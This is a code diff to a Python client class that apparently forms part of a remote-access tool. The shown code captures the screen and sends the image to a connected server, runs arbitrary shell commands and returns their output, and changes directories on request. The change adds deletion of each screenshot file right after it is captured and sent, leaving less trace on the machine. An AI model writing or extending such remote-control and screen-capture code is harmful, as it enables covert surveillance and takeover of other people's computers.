@@ -23,14 +23,18 @@ class Client(object):
     def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
         self.screenshotPath = '/home/znairy/736f6e61726973.png'
-        
+
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
+
+    def removeScreenshot(self):
+        Path(self.screenshotPath).unlink(missing_ok=True)
 
     def screenshot(self, args):
         grab().save(self.screenshotPath)
         namefile, extension, file = self.splitFile(self.screenshotPath)
-
+        self.removeScreenshot()
+        
         header = {
             "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
             "extension": extension,
@@ -56,6 +60,9 @@ class Client(object):
         try:
             chdir(directory)
             self.sendCommand(self.lastCommand, '.')
+        
+        except PermissionError:
+            self.sendCommand(self.lastCommand)
         except FileNotFoundError:
             self.sendCommand(self.lastCommand)
 
@@ -92,7 +99,7 @@ class Client(object):
 
     def outputCommand(self, command):
         return getoutput(command).encode()
-    
+
     def sendCommand(self, command, customOutput=''):
         if not customOutput:
             output = self.outputCommand(command)
@@ -108,7 +115,7 @@ class Client(object):
         self.sendHeader(header)
         sleep(0.5)
         self.__Client.send(output)
-    
+
     def runCommand(self, cmd):
         command, args = self.splitCommand(cmd)
 
